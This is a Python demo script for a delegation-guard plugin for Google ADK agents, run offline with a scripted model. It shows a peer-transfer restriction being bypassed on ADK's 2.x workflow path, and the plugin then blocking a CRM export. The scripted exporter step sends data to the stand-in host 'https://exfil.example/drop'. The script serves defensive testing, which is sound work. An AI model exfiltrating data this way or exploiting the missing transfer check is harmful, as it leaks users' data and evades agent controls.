"""ADK peer transfer, contained — the attenu-guard pilot example.

What this shows, offline, with a scripted model (no API key):

  [1] Google ADK 2.7.1, no guard: an agent with `disallow_transfer_to_peers=True`
      transfers to its peer anyway on the 2.x workflow path, and the peer's export
      tool BODY RUNS. (Issue #3850 was fixed upstream in `flows/llm_flows` — commit
      fa18d26a — but `google/adk/workflow/utils/_transfer_utils.py`, the path 2.x
      runs by default, has no check. Pinned by the test next to this file.)
  [2] The same tree with `DelegationGuardPlugin`: the transfer still happens (that is
      ADK's decision to make), but the peer holds only `meet(analyst, exporter)` —
      the export is DENIED before the tool body runs. The sink proves it.
  [3] The audit log verifies offline; a signed evidence bundle verifies too.

Exit codes: 0 = every expectation held · 1 = an expectation failed ·
3 = ADK now enforces the peer restriction on this path (the story premise changed;
    the guard part still holds — see README "freshness").

Run:  python examples/integrations/google_adk/peer_transfer/demo.py
"""
from __future__ import annotations

import asyncio
import importlib.util
import sys
import tempfile
from pathlib import Path
from typing import Any

from google.adk.agents.llm_agent import LlmAgent
from google.adk.apps.app import App
from google.adk.runners import Runner
from google.adk.sessions.in_memory_session_service import InMemorySessionService
from google.genai import types

from attenu_guard import AuditLog, Authority, EgressRank, Guard, RowLimit
from attenu_guard import evidence
from attenu_guard.adapters import google_adk as ag
from attenu_guard.wire import HS256TestSigner

# The parent demo carries the scripted model and the effect-recording tools.
_PARENT = Path(__file__).resolve().parents[1] / "demo.py"
_spec = importlib.util.spec_from_file_location("attenu_adk_parent_demo", _PARENT)
parent = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(parent)   # type: ignore[union-attr]

EXIT_OK, EXIT_FAIL, EXIT_PREMISE_CHANGED = 0, 1, 3


def _fc(name: str, **args) -> types.Part:
    return types.Part.from_function_call(name=name, args=args)


def _text(t: str) -> types.Part:
    return types.Part.from_text(text=t)


def script(export_calls: int = 1) -> dict[str, list]:
    """root → analyst; analyst (peers disallowed) → exporter; exporter exports."""
    return {
        "root": [_fc("transfer_to_agent", agent_name="analyst")],
        "analyst": [_fc("transfer_to_agent", agent_name="exporter")],
        "exporter": [_fc("crm_export", destination="https://exfil.example/drop")] * export_calls + [_text("done")],
    }


def build_tree(model, sink: list, *, extra_exporter_tools: list | None = None) -> LlmAgent:
    analyst = LlmAgent(name="analyst", model=model, description="Analyses the pipeline (read-only).",
                       disallow_transfer_to_peers=True)
    exporter = LlmAgent(name="exporter", model=model, description="Exports CRM data.",
                        disallow_transfer_to_peers=True,
                        tools=[parent.make_crm_export(sink), *(extra_exporter_tools or [])])
    return LlmAgent(name="root", model=model, description="Routes work.", sub_agents=[analyst, exporter])


def build_plugin(root_guard: Guard) -> ag.DelegationGuardPlugin:
    return ag.DelegationGuardPlugin(
        root_guard, root_agent_name="root",
        delegations={
            "analyst": parent.SUMMARIZER_REQUEST,            # crm.read, egress none
            "exporter": Authority(scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        },
        tools=parent.TOOL_AUTHORITIES,
    )


def require_guard(app: App) -> None:
    """Fail closed: refuse to run an app that does not carry the guard plugin."""
    plugins = getattr(app, "plugins", None) or []
    if not any(isinstance(p, ag.DelegationGuardPlugin) for p in plugins):
        raise RuntimeError("attenu-guard: DelegationGuardPlugin is not attached to this App — refusing to run unguarded")


async def _drive(app: App, message: str = "go") -> list:
    sessions = InMemorySessionService()
    runner = Runner(app=app, session_service=sessions)
    session = await sessions.create_session(app_name=app.name, user_id="u")
    events = []
    async for e in runner.run_async(user_id=session.user_id, session_id=session.id,
                                    new_message=types.Content(role="user", parts=[_text(message)])):
        events.append(e)
    return events


def function_responses(events) -> dict:
    out: dict[str, Any] = {}
    for e in events:
        for part in (e.content.parts if e.content and e.content.parts else []):
            if part.function_response:
                out[part.function_response.name] = part.function_response.response
    return out


def transferred_to(events, agent: str) -> bool:
    return any(getattr(e.actions, "transfer_to_agent", None) == agent for e in events)


async def run_unguarded(**kw) -> tuple[list, list]:
    sink: list = []
    app = App(name="adk-peer-unguarded", root_agent=build_tree(parent.ScriptedLlm(script=script(**kw)), sink))
    return await _drive(app), sink


async def run_guarded(audit_path=None, *, export_calls: int = 1, extra_exporter_tools=None):
    sink: list = []
    root_guard = Guard.issue("root", parent.ROOT_AUTHORITY, task="route", audit_path=audit_path)
    plugin = build_plugin(root_guard)
    app = App(name="adk-peer-guarded",
              root_agent=build_tree(parent.ScriptedLlm(script=script(export_calls)), sink,
                                    extra_exporter_tools=extra_exporter_tools),
              plugins=[plugin])
    require_guard(app)
    events = await _drive(app)
    return events, sink, root_guard, plugin


def main() -> int:
    print("[1] ADK 2.7.1, no guard — analyst has disallow_transfer_to_peers=True")
    events, sink = asyncio.run(run_unguarded())
    if not transferred_to(events, "exporter"):
        print("    ADK refused the peer transfer on this path — the story premise changed (see README: freshness).")
        return EXIT_PREMISE_CHANGED
    print(f"    peer transfer went through; export tool body ran: {sink}")
    if not sink:
        print("    unexpected: transfer happened but the tool body did not run"); return EXIT_FAIL

    print("[2] same tree, DelegationGuardPlugin attached")
    with tempfile.TemporaryDirectory() as td:
        log = Path(td) / "audit.jsonl"
        events, sink, root_guard, plugin = asyncio.run(run_guarded(audit_path=log))
        fr = function_responses(events)
        analyst, exporter = plugin.guard_for("analyst"), plugin.guard_for("exporter")
        print(f"    transfer still happened (ADK's call): {transferred_to(events, 'exporter')}")
        print(f"    exporter ⊆ analyst ⊆ root: {exporter.is_narrower_than(analyst)} / {analyst.is_narrower_than(root_guard)}")
        print(f"    export denied before the body ran: response={fr.get('crm_export', {}).get('error')} · side effects={sink}")
        ok = (transferred_to(events, "exporter") and sink == [] and fr.get("crm_export", {}).get("error") == "authority_denied"
              and exporter.is_narrower_than(analyst) and analyst.is_narrower_than(root_guard))

        print("[3] evidence")
        entries = root_guard.audit_log().entries
        chain_ok, err = AuditLog.verify(entries)
        print(f"    hash chain verifies: {chain_ok} ({len(entries)} events, {log.name})")
        signer = HS256TestSigner(b"demo-key", kid="demo")
        bundle = evidence.export_bundle(root_guard.audit_log(), signer)
        rep = evidence.verify_bundle(bundle, signer)
        c = rep["checks"]
        print(f"    signed bundle verifies offline: integrity={c['integrity']} monotonicity={c['monotonicity']} containment={c['containment']} ok={rep['ok']}")
        ok = ok and chain_ok and rep["ok"]
    print("RESULT:", "OK" if ok else "FAIL")
    return EXIT_OK if ok else EXIT_FAIL


if __name__ == "__main__":
    sys.exit(main())
